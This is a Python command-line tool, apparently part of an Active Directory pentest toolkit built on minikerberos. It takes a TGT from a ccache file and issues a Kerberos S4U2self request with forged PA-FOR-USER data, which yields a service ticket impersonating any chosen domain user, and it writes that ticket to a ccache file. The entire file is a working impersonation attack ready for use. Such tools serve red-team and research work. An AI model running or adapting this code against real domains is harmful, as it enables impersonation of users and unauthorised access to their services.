#!/usr/bin/env python3
#
# Based on examples from minikerberos by skelsec
#
# Author:
#  Tamas Jos (@skelsec)
#  Dirk-jan Mollema (@_dirkjan)
#
import os
import logging
import asyncio
import datetime
import pprint
import secrets

from minikerberos import logger
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.common.creds import KerberosCredential
from minikerberos.client import KerbrosClient
from minikerberos.common.spn import KerberosSPN
from minikerberos.protocol.asn1_structs import ETYPE_INFO, ETYPE_INFO2, \
    PADATA_TYPE, PA_PAC_REQUEST, PA_ENC_TS_ENC, EncryptedData, krb5_pvno, KDC_REQ_BODY, \
    AS_REQ, KDCOptions, EncASRepPart, EncTGSRepPart, PrincipalName, Realm, \
    Checksum, APOptions, Authenticator, Ticket, AP_REQ, TGS_REQ, CKSUMTYPE, \
    PA_FOR_USER_ENC, PA_PAC_OPTIONS, PA_PAC_OPTIONSTypes
from minikerberos.protocol.errors import KerberosError
from minikerberos.protocol.encryption import Key, _enctype_table, _HMACMD5
from minikerberos.protocol.constants import PaDataType, NAME_TYPE, MESSAGE_TYPE

class KerberosClient(KerbrosClient):

    @staticmethod
    def from_tgt(target, tgt, key, ccred):
        """
        Sets up the kerberos object from tgt and the session key.
        Use this function when pulling the TGT from ccache file.
        """
        kc = KerberosClient(ccred, target)
        kc.kerberos_TGT = tgt

        kc.kerberos_cipher_type = key['keytype']
        kc.kerberos_session_key = Key(kc.kerberos_cipher_type, key['keyvalue'])
        kc.kerberos_cipher = _enctype_table[kc.kerberos_cipher_type]
        return kc

    def S4U2self(self, user_to_impersonate, spn_user, supp_enc_methods = None):
        """
        user_to_impersonate : KerberosTarget class
        """

        if not self.kerberos_TGT:
            logger.debug('[S4U2self] TGT is not available! Fetching TGT...')
            self.get_TGT()

        supp_enc = [self.kerberos_cipher_type,]
        auth_package_name = 'Kerberos'
        now = datetime.datetime.now(datetime.timezone.utc)


        ###### Calculating authenticator data
        authenticator_data = {}
        authenticator_data['authenticator-vno'] = krb5_pvno
        authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
        authenticator_data['cname'] = self.kerberos_TGT['cname']
        authenticator_data['cusec'] = now.microsecond
        authenticator_data['ctime'] = now.replace(microsecond=0)

        authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)

        ap_req = {}
        ap_req['pvno'] = krb5_pvno
        ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
        ap_req['ap-options'] = APOptions(set())
        ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
        ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})

        pa_data_auth = {}
        pa_data_auth['padata-type'] = PaDataType.TGS_REQ.value
        pa_data_auth['padata-value'] = AP_REQ(ap_req).dump()

        ###### Calculating checksum data

        S4UByteArray = NAME_TYPE.PRINCIPAL.value.to_bytes(4, 'little', signed = False)
        S4UByteArray += user_to_impersonate.username.encode()
        S4UByteArray += user_to_impersonate.domain.encode()
        S4UByteArray += auth_package_name.encode()
        logger.debug('[S4U2self] S4UByteArray: %s' % S4UByteArray.hex())
        logger.debug('[S4U2self] S4UByteArray: %s' % S4UByteArray)

        chksum_data = _HMACMD5.checksum(self.kerberos_session_key, 17, S4UByteArray)
        logger.debug('[S4U2self] chksum_data: %s' % chksum_data.hex())


        chksum = {}
        chksum['cksumtype'] = int(CKSUMTYPE('HMAC_MD5'))
        chksum['checksum'] = chksum_data


        ###### Filling out PA-FOR-USER data for impersonation
        pa_for_user_enc = {}
        pa_for_user_enc['userName'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': user_to_impersonate.get_principalname()})
        pa_for_user_enc['userRealm'] = user_to_impersonate.domain
        pa_for_user_enc['cksum'] = Checksum(chksum)
        pa_for_user_enc['auth-package'] = auth_package_name

        pa_for_user = {}
        pa_for_user['padata-type'] = int(PADATA_TYPE('PA-FOR-USER'))
        pa_for_user['padata-value'] = PA_FOR_USER_ENC(pa_for_user_enc).dump()

        ###### Constructing body

        krb_tgs_body = {}
        krb_tgs_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','canonicalize']))
        krb_tgs_body['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': spn_user.get_principalname()})
        krb_tgs_body['realm'] = self.kerberos_TGT['crealm'].upper()
        krb_tgs_body['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
        krb_tgs_body['nonce'] = secrets.randbits(31)
        krb_tgs_body['etype'] = supp_enc #selecting according to server's preferences


        krb_tgs_req = {}
        krb_tgs_req['pvno'] = krb5_pvno
        krb_tgs_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
        krb_tgs_req['padata'] = [pa_data_auth, pa_for_user]
        krb_tgs_req['req-body'] = KDC_REQ_BODY(krb_tgs_body)

        req = TGS_REQ(krb_tgs_req)

        logger.debug('[S4U2self] Sending request to server')
        try:
            reply = self.ksoc.sendrecv(req.dump())
        except KerberosError as e:
            if e.errorcode.value == 16:
                logger.error('[S4U2self] Failed to get S4U2self! Error code (16) indicates that delegation is not enabled for this account! Full error: %s' % e)

            raise e

        logger.debug('[S4U2self] Got reply, decrypting...')
        tgs = reply.native

        encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
        key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

        self.ccache.add_tgs(tgs, encTGSRepPart)
        logger.debug('[S4U2self] Got valid TGS reply')
        self.kerberos_TGS = tgs
        return tgs, encTGSRepPart, key

async def amain(args):
    # This only works with ccache because I had to work around everything breaking
    # when using a ccache
    cu = KerberosClientFactory.from_url(args.kerberos_connection_url)
    target = cu.get_target()
    ccred = KerberosCredential.from_ccache(cu.secret)
    service_spn = KerberosSPN.from_spn(args.spn)
    target_user = KerberosSPN.from_user_email(args.targetuser)

    if not ccred.ccache:
        logger.info('You need to specify a ccache in the Kerberos URL')
        return
    else:
        logger.debug('Getting TGS via TGT from CCACHE')
        for tgt, key in ccred.ccache.get_all_tgt():
            try:
                logger.info('Trying to get SPN with %s for %s' % (target_user, service_spn))
                client = KerberosClient.from_tgt(target, tgt, key, ccred)

                tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn)
                client.ccache.add_tgs(tgs, encTGSRepPart)
                logger.info('Success!')
            except SyntaxError as e:
                logger.debug('This ticket is not usable it seems Reason: %s' % e)
                continue
            else:
                break

    client.ccache.to_file(args.ccache)
    logger.info('Done!')


def main():
    import argparse

    parser = argparse.ArgumentParser(description='Gets an S4U2self ticket impersonating given user', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
    parser.add_argument('kerberos_connection_url', help='the kerberos target string in the following format kerberos+ccache://domain\\user:file.ccache@<domaincontroller-ip>')
    parser.add_argument('spn', help='the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER\'S HOSTNAME MUST BE USED, NOT IP!!!')
    parser.add_argument('targetuser', help='')
    parser.add_argument('ccache', help='ccache file to store the TGT ticket in')
    parser.add_argument('-v', '--verbose', action='count', default=0)

    args = parser.parse_args()
    if args.verbose == 0:
        logger.setLevel(logging.WARNING)
    elif args.verbose == 1:
        logger.setLevel(logging.INFO)
    else:
        logger.setLevel(1)

    asyncio.run(amain(args))


if __name__ == '__main__':
    main()
